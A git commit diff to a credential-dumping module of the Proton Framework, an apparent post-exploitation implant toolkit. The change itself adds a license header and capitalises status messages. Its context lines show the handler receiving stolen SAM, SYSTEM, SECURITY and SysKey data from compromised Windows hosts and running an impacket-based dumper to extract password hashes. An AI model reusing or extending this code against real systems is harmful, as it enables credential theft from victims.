ac0f635cf6821b2c1604f231a92763e46d8fd47c
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-02-08 17:40:29 +0300

    Update hashdump_sam.py

--- modules/implant/gather/hashdump_sam.py
+++ modules/implant/gather/hashdump_sam.py
@@ -1,3 +1,23 @@
+#!/usr/bin/env python3
+
+#            ---------------------------------------------------
+#                             Proton Framework              
+#            ---------------------------------------------------
+#                Copyright (C) <2019-2020>  <Entynetproject>
+#
+#        This program is free software: you can redistribute it and/or modify
+#        it under the terms of the GNU General Public License as published by
+#        the Free Software Foundation, either version 3 of the License, or
+#        any later version.
+#
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+#        GNU General Public License for more details.
+#
+#        You should have received a copy of the GNU General Public License
+#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
 import core.implant
 
 class HashDumpSAMImplant(core.implant.Implant):
@@ -77,7 +97,7 @@ class HashDumpSAMJob(core.job.Job):
 
         if task == "SAM":
             handler.reply(200)
-            self.print_status("received SAM hive (%d bytes)" % len(data))
+            self.print_status("Received SAM hive (%d bytes)" % len(data))
             self.sam_data = data
             self.sam_encoder = handler.get_header("encoder", 1252)
             return
@@ -85,7 +105,7 @@ class HashDumpSAMJob(core.job.Job):
         if task == "SYSTEM":
             handler.reply(200)
 
-            self.print_status("received SYSTEM hive (%d bytes)" % len(data))
+            self.print_status("Received SYSTEM hive (%d bytes)" % len(data))
             self.system_data = data
             self.system_encoder = handler.get_header("encoder", 1252)
             return
@@ -93,7 +113,7 @@ class HashDumpSAMJob(core.job.Job):
         if task == "SysKey":
             handler.reply(200)
 
-            self.print_status("received SysKey (%d bytes)" % len(data))
+            self.print_status("Received SysKey (%d bytes)" % len(data))
             self.syskey_data = data
             self.system_data = ""
             self.syskey_encoder = handler.get_header("encoder", 1252)
@@ -102,7 +122,7 @@ class HashDumpSAMJob(core.job.Job):
         if task == "SECURITY":
             handler.reply(200)
 
-            self.print_status("received SECURITY hive (%d bytes)" % len(data))
+            self.print_status("Received SECURITY hive (%d bytes)" % len(data))
             self.security_data = data
             self.security_encoder = handler.get_header("encoder", 1252)
             return
@@ -127,7 +147,7 @@ class HashDumpSAMJob(core.job.Job):
             data = self.decode_downloaded_data(data, "936")
             with open(self.sam_file, "wb") as f:
                 f.write(data)
-        self.print_status("decoded SAM hive (%s)" % self.sam_file)
+        self.print_status("Decoded SAM hive (%s)" % self.sam_file)
 
         self.security_file = self.save_file(self.security_data, "SECURITY", self.security_encoder)
         if self.options.get("CERTUTIL") == "true":
@@ -136,7 +156,7 @@ class HashDumpSAMJob(core.job.Job):
             data = self.decode_downloaded_data(data, "936")
             with open(self.security_file, "wb") as f:
                 f.write(data)
-        self.print_status("decoded SECURITY hive (%s)" % self.security_file)
+        self.print_status("Decoded SECURITY hive (%s)" % self.security_file)
 
         if self.system_data:
             self.system_file = self.save_file(self.system_data, "SYSTEM", self.system_encoder)
@@ -146,7 +166,7 @@ class HashDumpSAMJob(core.job.Job):
                 data = self.decode_downloaded_data(data, "936")
                 with open(self.system_file, "wb") as f:
                     f.write(data)
-            self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
+            self.print_status("Decoded SYSTEM hive (%s)" % self.system_file)
             cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
         else:
             self.syskey_data_file = self.save_file(self.syskey_data, "SYSKEY", self.syskey_encoder)
@@ -182,7 +202,7 @@ class HashDumpSAMJob(core.job.Job):
                 self.error("0", "There was a problem decoding the syskey. Try setting GETSYSHIVE to true and running again.", "Decode error.", "")
                 return False
 
-            self.print_status("decoded SysKey: 0x%s" % self.syskey)
+            self.print_status("Decoded SysKey: 0x%s" % self.syskey)
             cmd = ['python2', path, '-sam', self.sam_file, '-bootkey', self.syskey, '-security', self.security_file, 'LOCAL']
 
         p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True, env={"PYTHONPATH": "./data/impacket"})
